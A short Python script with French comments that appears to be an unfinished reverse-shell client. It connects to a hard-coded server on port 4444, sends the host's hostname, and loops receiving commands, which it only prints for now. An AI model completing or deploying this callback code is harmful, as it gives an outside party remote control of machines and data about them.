import socket
import subprocess
import os
import sys

SERVER_IP = "192.168.1.100"
SERVER_PORT = 4444
BUFFER = 4096


# recupere la vraie ip de la machine, pas 127.0.0.1
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"


def main():
    print("[*] Demarrage du client...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")

    # on envoie juste le hostname pour l'instant
    sock.send(socket.gethostname().encode())

    while True:
        commande = sock.recv(BUFFER).decode().strip()
        if not commande:
            print("[-] Connexion perdue")
            break

        if commande == "exit":
            break

        print(f"[*] Commande recue: {commande}")

    sock.close()


if __name__ == "__main__":
    main()
